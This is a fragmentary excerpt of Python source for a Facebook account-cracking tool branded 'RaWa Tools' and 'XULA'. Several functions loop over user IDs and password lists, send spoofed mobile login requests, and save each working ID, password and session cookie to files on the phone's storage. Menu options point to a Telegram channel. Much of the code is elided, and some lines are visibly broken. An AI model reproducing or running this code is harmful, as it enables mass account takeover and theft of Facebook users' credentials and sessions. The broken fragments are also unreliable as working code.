...
os.system('espeak -a 300 " Welcome,   to,  RaWa,   Tools"')
time.sleep(2)
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                linex()
                                print(f' \33[1;97m[\33[1;94m 1\33[1;97m ] \33[1;92m [ 1 ] METHOD [NEW🙂] ')
                                linex()
                                mthd=input('\x1b[1;97m Choose: ')
                                plist = []
                                clear()
                                linex()
                                print('\33[1;96 1.  OLD FACEBOOK ')
                                linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                ...
                                os.system(f'xdg-open https://t.me/b72_i');menu()
                        elif xd in ['7','07']:
                                crack()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://t.me/b72_i');menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def ffb(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                ...
                                open('/sdcard/𝐗𝐔𝐋𝐀-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
def api(ids,names,passlist):
        global loop,oks,cps,lim
        p=round(loop*100/lim,2)
        sys.stdout.write('\r\r\033[1;37m [\033[1;36m𝐗𝐮𝐋𝐚\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;33m%s%%\033[1;37m]\033[1;34m'%(loop,len(oks),p));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
    ...
    'viewport-width': '980',
                        ...
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[𝐗𝐔𝐋𝐀-𝐎𝐊] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+{kuki})
                                ...
                                if 'y' in pcp:
                                        print('\33[1;93m[𝐗𝐔𝐋𝐀-𝐂𝐏] '+ids+' | '+pas+'\33[0;97m')
                                        open('/sdcard/𝐗𝐔𝐋𝐚-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api3(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[𝐗𝐔𝐋𝐀-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                os.system('espeak -a 300 " HALO,  OK,    ,ID   PASSWORD"')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/HALO-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/HALO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [𝐗𝐔𝐋𝐀-𝐎𝐊] '+str(uid)+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " HALO,  OK,    ,ID   PASSWORD"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/𝐗𝐔𝐋𝐀-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/𝐗𝐔𝐋𝐀_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [𝐗𝐔𝐋𝐀-𝐂𝐏] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝐗𝐔𝐋𝐀-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
